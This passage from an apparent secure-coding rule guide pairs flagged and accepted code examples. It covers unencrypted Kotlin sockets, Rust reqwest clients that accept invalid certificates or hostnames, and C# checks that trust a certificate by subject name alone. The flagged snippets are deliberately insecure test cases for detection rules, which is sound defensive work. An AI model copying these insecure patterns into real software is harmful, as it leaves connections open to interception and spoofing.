        val ssoc1: ServerSocket = ServerSocket()
        ssoc1.close()
        // ruleid: unencrypted-socket
        val ssoc2: ServerSocket = ServerSocket(1234, 10)
        ssoc2.close()
    }
}
```

**Correct: SSL sockets**

```kotlin
package testcode.crypto

import javax.net.ssl.SSLServerSocketFactory
import javax.net.ssl.SSLSocketFactory

public class UnencryptedSocket {

    fun sslSocket(): Void {
        // ok: unencrypted-socket
        val soc: Socket = SSLSocketFactory.getDefault().createSocket("www.google.com", 443)
        doGetRequest(soc)
    }
}

public class UnencryptedServerSocket {

    fun sslServerSocket(): Void {
        // ok: unencrypted-socket
        val ssoc: ServerSocket = SSLServerSocketFactory.getDefault().createServerSocket(1234)
        ssoc.close()
    }
}
```

**Incorrect: accepting invalid certificates**

```rust
use reqwest::header;

// ruleid: reqwest-accept-invalid
let client = reqwest::Client::builder()
    .danger_accept_invalid_hostnames(true)
    .build();

// ruleid: reqwest-accept-invalid
let client = reqwest::Client::builder()
    .danger_accept_invalid_certs(true)
    .build();

// ruleid: reqwest-accept-invalid
let client = reqwest::Client::builder()
    .user_agent("USER AGENT")
    .cookie_store(true)
    .danger_accept_invalid_hostnames(true)
    .build();

// ruleid: reqwest-accept-invalid
let client = reqwest::Client::builder()
    .user_agent("USER AGENT")
    .cookie_store(true)
    .danger_accept_invalid_certs(true)
    .build();
```

**Correct: certificate validation enabled**

```rust
use reqwest::header;

// ok: reqwest-accept-invalid
let client = reqwest::Client::builder()
    .user_agent("USER AGENT")
    .build();
```

**Incorrect: validating certificates by subject name**

```csharp
using System.IdentityModel.Tokens;

namespace System.IdentityModel.Samples
{
    public class TrustedIssuerNameRegistry : IssuerNameRegistry
    {
        public override string GetIssuerName(SecurityToken securityToken)
        {
            X509SecurityToken x509Token = securityToken as X509SecurityToken;
            if (x509Token != null)
            {
                // ruleid: X509-subject-name-validation
                if (String.Equals(x509Token.Certificate.SubjectName.Name, "CN=localhost"))
                {
                    return x509Token.Certificate.SubjectName.Name;
                }

                // ruleid: X509-subject-name-validation
                if (x509Token.Certificate.SubjectName.Name == "CN=localhost")
                {
                    return x509Token.Certificate.SubjectName.Name;
                }
            }
        }
    }
}
```

**Correct: use proper certificate validation**

```csharp
using System.Security.Cryptography.X509Certificates;

public bool ValidateCertificate(X509Certificate2 certificate)
{
    // ok: X509-subject-name-validation
    // Use X509Certificate2.Verify() method instead of comparing subject names
    return certificate.Verify();
}
```

Reference: [https://nodejs.org/api/https.html](https://nodejs.org/api/https.html), [https://owasp.org/Top10/A02_2021-Cryptographic_Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures), [https://golang.org/pkg/crypto/tls/](https://golang.org/pkg/crypto/tls/), [https://docs.python.org/3/library/ssl.html](https://docs.python.org/3/library/ssl.html), [https://docs.oracle.com/en/java/javase/11/docs/api/java.net.http/java/net/http/HttpClient.html](https://docs.oracle.com/en/java/javase/11/docs/api/java.net.http/java/net/http/HttpClient.html), [https://ruby-doc.org/stdlib/libdoc/openssl/rdoc/OpenSSL.html](https://ruby-doc.org/stdlib/libdoc/openssl/rdoc/OpenSSL.html), [https://www.php.net/manual/en/function.curl-setopt.php](https://www.php.net/manual/en/function.curl-setopt.php), [https://kotlinlang.org/api/latest/jvm/stdlib/](https://kotlinlang.org/api/latest/jvm/stdlib/), [https://docs.rs/reqwest/latest/reqwest/struct.ClientBuilder.html](https://docs.rs/reqwest/latest/reqwest/struct.ClientBuilder.html), [https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509certificate2](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509certificate2)

---

